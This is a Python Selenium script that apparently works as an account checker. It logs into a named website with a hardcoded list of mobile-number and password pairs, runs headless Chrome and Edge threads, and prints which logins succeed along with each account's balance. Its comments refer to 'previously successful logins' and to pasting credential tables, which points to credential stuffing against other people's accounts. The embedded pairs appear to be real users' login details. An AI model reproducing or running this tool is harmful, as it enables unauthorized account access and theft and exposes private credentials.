# check faster when u know all the attributes(login details from html)
# Use this when u have to check balance of previously successful logins by pasting input data as shown below
# CHECK ONLY BALANCE WHEN U HAVE INPUT DATA IN BELOW FORMAT
# u can directly paste the table data without converting it
# USE THIS FOR BEST PERFORMANCE
# format: mobile      password
# format: 7353346164      7353346164s
# check HELPME.txt for reference

import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, TimeoutException, NoSuchWindowException
import threading
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

login_url = "https://www.xykj22-bj99.com/index/user/login.html"
profile_url = "https://www.xykj22-bj99.com/index/my/index.html"  # Profile URL
app_login_mobile= "tel"
app_login_password= "pwd"
app_login_button= "login"
balance_attribute= 'small[data-v-d5f15326]'
'''
<span data-v-d5f15326="">Balance</span>
<em data-v-d5f15326="">
<small data-v-d5f15326="">50.00</small>
</em>
'''

#mobile password
input_data = """\
7353346164      7353346164s  
9756468254      975646aa     
7562879235      i88888         
9798205853      aaa111       
7398003572      aman1234     
8979931047      Moienkhan8979
"""
lines = input_data.split('\n')
successful_login = []
for line in lines:
    parts = line.split()
    if len(parts) == 2: #make it 3 if u have only mobile and password balance
        mobile, password = parts #then add ,balance here
        successful_login.append((mobile, password))
print("successful_login =", successful_login)

balance_list = []
success_list = []

def get_profile(browser_name, successful_login):
    # Define the options for headless mode
    if browser_name == "Chrome":
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        driver = webdriver.Chrome(options=options)
    else:
        options = webdriver.EdgeOptions()
        options.add_argument('--headless')
        driver = webdriver.Edge(options=options)

    wait = WebDriverWait(driver, 10)

    for mobile, password in successful_login:
        try:
            driver.get(login_url)
            startpage = driver.current_url
            print(f"{mobile} is logging in...")
            username_field = wait.until(EC.presence_of_element_located((By.NAME, app_login_mobile)))
            password_field = driver.find_element(By.NAME, app_login_password)
            username_field.send_keys(mobile)
            password_field.send_keys(password)
            login_button = driver.find_element(By.CLASS_NAME, app_login_button)
            login_button.click()

            for _ in range(10):  # loop till we login
                if driver.current_url != startpage:
                    break
                time.sleep(0.5)
            if driver.current_url == startpage:
                # Cannot Login ! 
                print(f"Failed {mobile}")
            else:
                driver.get(profile_url)  # loop till we reach profile page
                for _ in range(10):
                    if driver.current_url == profile_url:
                        print(f"{mobile} is in profile page!")
                        success_list.append((mobile,password))
                        break
                    time.sleep(0.5)

                # Wait for the balance element to load (you should inspect the page and identify the correct element)
                balance_element = driver.find_element(By.CSS_SELECTOR, balance_attribute)
                balance = balance_element.text
                balance_list.append((mobile,password, balance))

        except NoSuchElementException:
            print(f"Element not found!. Check your element for variables in the HTML code using attribute-checker.py")
        except TimeoutException:
            print(f"Timed out while waiting to load for {mobile}.")
        except NoSuchWindowException:
            print(f"The browser window was closed unexpectedly for {mobile}.")
        except Exception:
            print(f"An unexpected error occurred for {mobile}")
    driver.quit()

def split_credentials(credentials):
    mid = len(credentials) // 2
    return credentials[:mid], credentials[mid:]


if __name__ == '__main__':
    # process: get the withdraw/balance amount 
    chrome_credentials, edge_credentials = split_credentials(successful_login)
    # Create two threads for Chrome and Edge browsers for get_profile
    chrome_thread = threading.Thread(target=get_profile, args=("Chrome", chrome_credentials))
    edge_thread = threading.Thread(target=get_profile, args=("Edge", edge_credentials))
    # Start both threads
    chrome_thread.start()
    edge_thread.start()
    # Wait for both threads to finish
    chrome_thread.join()
    edge_thread.join()
    # Print in a single table format
    if success_list:
        print("\Success List:")
        print("Mobile\t\tPassword")
        for mobile, password in success_list:
            print(f"{mobile}\t{password}")
    if balance_list:
        print("\nAll Balances:")
        print("Mobile\t\tPassword\t\tBalance")
        for mobile, password, balance in balance_list:
            print(f"{mobile}\t{password}\t{balance}")
